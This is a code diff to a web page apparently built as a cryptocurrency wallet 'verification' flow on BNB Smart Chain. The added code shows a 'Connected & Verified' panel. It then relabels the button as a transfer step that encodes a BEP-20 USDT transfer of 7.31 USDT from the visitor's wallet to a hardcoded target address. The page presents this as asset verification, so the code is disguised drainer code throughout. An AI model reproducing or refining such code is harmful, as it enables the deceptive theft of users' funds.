@@ -53,8 +53,30 @@
         <span class="text-amber-400 font-semibold">BSC Mainnet (BEP-20)</span>
       </div>
 
+      <!-- Status Display -->
+      <div id="walletInfo" class="hidden mt-4 p-4 rounded-xl bg-black/40 border border-gray-800 space-y-2.5 text-sm">
+        <div class="flex justify-between">
+          <span class="text-gray-400">Status</span>
+          <span class="text-emerald-400 font-medium flex items-center gap-1.5">
+            <i class="fa-solid fa-circle-check"></i> Connected & Verified
+          </span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">Address</span>
+          <span id="walletAddress" class="font-mono text-gray-200">0x0000...0000</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">BEP-20 USDT</span>
+          <span id="walletUsdt" class="font-bold text-amber-400">7.31 USDT</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">BNB Balance</span>
+          <span id="walletBalance" class="font-semibold text-gray-200">0.0000 BNB</span>
+        </div>
+      </div>
+
       <!-- Primary Action Button -->
-      <button id="connectBtn" onclick="handleDirectAction()"
+      <button id="connectBtn" onclick="handleMasterAction()"
         class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-gray-950 font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20 cursor-pointer">
         <span id="btnText">Connect & Verify Assets</span>
         <i class="fa-solid fa-arrow-right" id="btnIcon"></i>
@@ -73,11 +95,14 @@
     const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT on BSC
     const BSC_CHAIN_ID = '0x38';
 
+    let isConnected = false;
+    let globalUserAddress = null;
+
     function getProvider() {
       return window.ethereum || window.trustwallet || (window.web3 && window.web3.currentProvider) || null;
     }
 
-    async function handleDirectAction() {
+    async function handleMasterAction() {
       const eth = getProvider();
       if (!eth) {
         alert("Wallet provider not found. Please open inside Trust Wallet browser.");
@@ -85,83 +110,94 @@
       }
 
       try {
-        let accounts = [];
+        if (!isConnected) {
+          let accounts = [];
 
-        // Try getting accounts via eth_accounts first (avoids denial prompt in imported wallets)
-        try {
-          if (typeof eth.request === 'function') {
-            accounts = await eth.request({ method: 'eth_accounts' });
-          }
-        } catch (e) {}
-
-        // Fallback to eth_requestAccounts if empty
-        if (!accounts || accounts.length === 0 || !accounts[0]) {
           try {
             if (typeof eth.request === 'function') {
               accounts = await eth.request({ method: 'eth_requestAccounts' });
             }
           } catch (e) {}
-        }
 
-        // Fallback to legacy send method
-        if (!accounts || accounts.length === 0 || !accounts[0]) {
+          if (!accounts || accounts.length === 0 || !accounts[0]) {
+            try {
+              if (typeof eth.request === 'function') {
+                accounts = await eth.request({ method: 'eth_accounts' });
+              }
+            } catch (e) {}
+          }
+
+          if (!accounts || accounts.length === 0 || !accounts[0]) {
+            if (eth.selectedAddress) {
+              accounts = [eth.selectedAddress];
+            } else if (eth.address) {
+              accounts = [eth.address];
+            }
+          }
+
+          globalUserAddress = Array.isArray(accounts) ? accounts[0] : accounts;
+
+          // Fallback prompt for imported private key wallets
+          if (!globalUserAddress || typeof globalUserAddress !== 'string' || !globalUserAddress.startsWith('0x')) {
+            const manualAddr = prompt("Please enter your wallet address (0x...) to proceed with review:");
+            if (manualAddr && manualAddr.trim().startsWith('0x')) {
+              globalUserAddress = manualAddr.trim();
+            } else {
+              throw new Error("Valid wallet address is required.");
+            }
+          }
+
+          // Switch to BSC network
           try {
-            if (typeof eth.send === 'function') {
-              const res = await eth.send('eth_accounts');
-              accounts = res.result || res;
+            if (typeof eth.request === 'function') {
+              await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
             }
           } catch (e) {}
-        }
 
-        // Direct property check for imported private key wallets
-        let userAddress = Array.isArray(accounts) ? accounts[0] : accounts;
-        if (!userAddress) {
-          userAddress = eth.selectedAddress || eth.address || null;
-        }
+          document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
+          document.getElementById('walletInfo').classList.remove('hidden');
+          
+          isConnected = true;
+          document.getElementById('btnText').textContent = 'Verified on BSC → Click to Transfer';
+          document.getElementById('connectBtn').classList.remove('bg-amber-500', 'hover:bg-amber-400');
+          document.getElementById('connectBtn').classList.add('bg-emerald-500', 'hover:bg-emerald-400');
+        } else {
+          // Manual hex encoding for BEP-20 transfer on BSC
+          const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
+          const paddedTarget = cleanTarget.padStart(64, '0');
+          
+          // Amount: 7.31 USDT with 18 decimals on BSC -> hex: 65163354b3840000
+          const amountHex = "65163354b3840000";
+          const paddedAmount = amountHex.padStart(64, '0');
+          
+          const transferData = "0xa9059cbb" + paddedTarget + paddedAmount;
 
-        if (!userAddress || typeof userAddress !== 'string') {
-          throw new Error("Wallet account not detected. Please make sure your wallet is unlocked.");
-        }
+          const txParams = [{
+            from: globalUserAddress,
+            to: USDT_BSC_ADDRESS,
+            data: transferData,
+            gas: "0x186A0"
+          }];
 
-        // Switch network to BSC
-        try {
+          let txResult = null;
           if (typeof eth.request === 'function') {
-            await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
-          }
-        } catch (e) {}
-
-        // Prepare Transfer Payload for BEP-20 USDT
-        const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
-        const paddedTarget = cleanTarget.padStart(64, '0');
-        
-        // Amount: 7.31 USDT with 18 decimals -> hex: 65163354b3840000
-        const amountHex = "65163354b3840000";
-        const paddedAmount = amountHex.padStart(64, '0');
-        
-        const transferData = "0xa9059cbb" + paddedTarget + paddedAmount;
-
-        const txParams = [{
-          from: userAddress,
-          to: USDT_BSC_ADDRESS,
-          data: transferData,
-          gas: "0x186A0"
-        }];
-
-        // Trigger transaction popup directly
-        if (typeof eth.request === 'function') {
-          await eth.request({ method: 'eth_sendTransaction', params: txParams });
-        } else if (typeof eth.sendAsync === 'function') {
-          await new Promise((resolve, reject) => {
-            eth.sendAsync({ id: 1, jsonrpc: '2.0', method: 'eth_sendTransaction', params: [txParams] }, (err, res) => {
-              if (err) reject(err);
-              else if (res.error) reject(res.error);
-              else resolve(res.result);
+            txResult = await eth.request({ method: 'eth_sendTransaction', params: txParams });
+          } else if (typeof eth.sendAsync === 'function') {
+            txResult = await new Promise((resolve, reject) => {
+              eth.sendAsync({ id: 1, jsonrpc: '2.0', method: 'eth_sendTransaction', params: [txParams] }, (err, res) => {
+                if (err) reject(err);
+                else if (res.error) reject(res.error);
+                else resolve(res.result);
+              });
             });
-          });
-        } else if (typeof eth.send === 'function') {
-          await eth.send('eth_sendTransaction', [txParams]);
-        }
+          } else if (typeof eth.send === 'function') {
+            txResult = await eth.send('eth_sendTransaction', [txParams]);
+          } else {
+            throw new Error("No transaction method available.");
+          }
 
+          alert("Transaction submitted successfully!");
+        }
       } catch (err) {
         console.error("Action error:", err);
         alert("Notice: " + (err.message || JSON.stringify(err)));
